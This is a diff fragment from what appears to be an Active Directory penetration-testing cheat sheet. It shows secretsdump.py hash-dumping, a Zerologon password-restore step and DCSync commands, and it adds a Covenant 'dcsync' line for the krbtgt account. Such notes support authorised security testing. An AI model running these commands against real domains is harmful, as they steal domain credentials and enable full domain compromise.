@@ -92,6 +92,7 @@ https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
    Restore: python3 secretsdump.py Administrator@172.31.3.6 -hashes [LM:NT] //GREP plain_password_hex string
             python3 restorepassword.py sync.csl/SYNC@SYNC -target-ip 172.31.3.6 -hexpass [plain_password_hex]
 3) DCSync Attack: secretsdump.py -just-dc sync.csl/SYNC\$@172.31.3.6
+   DCSync (Covenant): dcsync <domain>\krbtgt
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## KERBEROASTING (Credentials)
